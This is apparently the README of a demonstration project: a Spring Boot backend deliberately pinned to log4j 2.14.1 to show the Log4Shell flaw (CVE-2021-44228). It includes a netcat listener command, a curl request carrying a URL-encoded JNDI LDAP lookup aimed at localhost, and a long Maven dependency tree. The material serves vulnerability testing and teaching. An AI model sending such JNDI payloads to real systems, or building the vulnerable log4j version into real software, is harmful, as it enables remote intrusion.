# log4j Spring vulnerable POC

This is a POC for a simple spring boot start backend with maven including vulnerable log4j version for [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

Spring boot bootstrapped with https://start.spring.io.

## commands

- `./mvnw spring-boot:run`: start server
-  `./mvnw dependency:tree`: print dependency tree and check for log4j version in use
- `nc -k -l 3030`: bash, start server socket to listen for arbitrary incoming TCP connections, e.g. from our vulnerable spring boot application.
- `curl http://localhost:8080/vuln2?input=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A3030%2F%7D` or `curl http://localhost:8080/vuln`: calls vulnerable GET-Endpoints

## How it works

Calling the endpoint (`localhost:8080/vuln` or `/localhost:8080vuln2?input=...` by spring boot) will trigger an HTTP call (here: to `localhost:3030` by `nc`) by writing certain data to log file. For more information please refer to it's CVE.


## current dependency tree

```
[INFO] --- maven-dependency-plugin:3.2.0:tree (default-cli) @ demo ---
[INFO] net.mnio:demo:jar:0.0.1-SNAPSHOT
[INFO] +- org.springframework.boot:spring-boot-starter-web:jar:2.6.1:compile
[INFO] |  +- org.springframework.boot:spring-boot-starter:jar:2.6.1:compile
[INFO] |  |  +- org.springframework.boot:spring-boot:jar:2.6.1:compile
[INFO] |  |  +- org.springframework.boot:spring-boot-autoconfigure:jar:2.6.1:compile
[INFO] |  |  +- jakarta.annotation:jakarta.annotation-api:jar:1.3.5:compile
[INFO] |  |  \- org.yaml:snakeyaml:jar:1.29:compile
[INFO] |  +- org.springframework.boot:spring-boot-starter-json:jar:2.6.1:compile
[INFO] |  |  +- com.fasterxml.jackson.core:jackson-databind:jar:2.13.0:compile
[INFO] |  |  |  +- com.fasterxml.jackson.core:jackson-annotations:jar:2.13.0:compile
[INFO] |  |  |  \- com.fasterxml.jackson.core:jackson-core:jar:2.13.0:compile
[INFO] |  |  +- com.fasterxml.jackson.datatype:jackson-datatype-jdk8:jar:2.13.0:compile
[INFO] |  |  +- com.fasterxml.jackson.datatype:jackson-datatype-jsr310:jar:2.13.0:compile
[INFO] |  |  \- com.fasterxml.jackson.module:jackson-module-parameter-names:jar:2.13.0:compile
[INFO] |  +- org.springframework.boot:spring-boot-starter-tomcat:jar:2.6.1:compile
[INFO] |  |  +- org.apache.tomcat.embed:tomcat-embed-core:jar:9.0.55:compile
[INFO] |  |  +- org.apache.tomcat.embed:tomcat-embed-el:jar:9.0.55:compile
[INFO] |  |  \- org.apache.tomcat.embed:tomcat-embed-websocket:jar:9.0.55:compile
[INFO] |  +- org.springframework:spring-web:jar:5.3.13:compile
[INFO] |  |  \- org.springframework:spring-beans:jar:5.3.13:compile
[INFO] |  \- org.springframework:spring-webmvc:jar:5.3.13:compile
[INFO] |     +- org.springframework:spring-aop:jar:5.3.13:compile
[INFO] |     +- org.springframework:spring-context:jar:5.3.13:compile
[INFO] |     \- org.springframework:spring-expression:jar:5.3.13:compile
[INFO] +- org.springframework.boot:spring-boot-starter-log4j2:jar:2.6.1:compile
[INFO] |  +- org.apache.logging.log4j:log4j-slf4j-impl:jar:2.14.1:compile
[INFO] |  |  +- org.slf4j:slf4j-api:jar:1.7.32:compile
[INFO] |  |  \- org.apache.logging.log4j:log4j-api:jar:2.14.1:compile
[INFO] |  +- org.apache.logging.log4j:log4j-core:jar:2.14.1:compile
[INFO] |  +- org.apache.logging.log4j:log4j-jul:jar:2.14.1:compile
[INFO] |  \- org.slf4j:jul-to-slf4j:jar:1.7.32:compile
[INFO] \- org.springframework.boot:spring-boot-starter-test:jar:2.6.1:test
[INFO]    +- org.springframework.boot:spring-boot-test:jar:2.6.1:test
[INFO]    +- org.springframework.boot:spring-boot-test-autoconfigure:jar:2.6.1:test
[INFO]    +- com.jayway.jsonpath:json-path:jar:2.6.0:test
[INFO]    |  \- net.minidev:json-smart:jar:2.4.7:test
[INFO]    |     \- net.minidev:accessors-smart:jar:2.4.7:test
[INFO]    |        \- org.ow2.asm:asm:jar:9.1:test
[INFO]    +- jakarta.xml.bind:jakarta.xml.bind-api:jar:2.3.3:test
[INFO]    |  \- jakarta.activation:jakarta.activation-api:jar:1.2.2:test
[INFO]    +- org.assertj:assertj-core:jar:3.21.0:test
[INFO]    +- org.hamcrest:hamcrest:jar:2.2:test
[INFO]    +- org.junit.jupiter:junit-jupiter:jar:5.8.1:test
[INFO]    |  +- org.junit.jupiter:junit-jupiter-api:jar:5.8.1:test
[INFO]    |  |  +- org.opentest4j:opentest4j:jar:1.2.0:test
[INFO]    |  |  +- org.junit.platform:junit-platform-commons:jar:1.8.1:test
[INFO]    |  |  \- org.apiguardian:apiguardian-api:jar:1.1.2:test
[INFO]    |  +- org.junit.jupiter:junit-jupiter-params:jar:5.8.1:test
[INFO]    |  \- org.junit.jupiter:junit-jupiter-engine:jar:5.8.1:test
[INFO]    |     \- org.junit.platform:junit-platform-engine:jar:1.8.1:test
[INFO]    +- org.mockito:mockito-core:jar:4.0.0:test
[INFO]    |  +- net.bytebuddy:byte-buddy:jar:1.11.22:test
[INFO]    |  +- net.bytebuddy:byte-buddy-agent:jar:1.11.22:test
[INFO]    |  \- org.objenesis:objenesis:jar:3.2:test
[INFO]    +- org.mockito:mockito-junit-jupiter:jar:4.0.0:test
[INFO]    +- org.skyscreamer:jsonassert:jar:1.5.0:test
[INFO]    |  \- com.vaadin.external.google:android-json:jar:0.0.20131108.vaadin1:test
[INFO]    +- org.springframework:spring-core:jar:5.3.13:compile
[INFO]    |  \- org.springframework:spring-jcl:jar:5.3.13:compile
[INFO]    +- org.springframework:spring-test:jar:5.3.13:test
[INFO]    \- org.xmlunit:xmlunit-core:jar:2.8.3:test
```
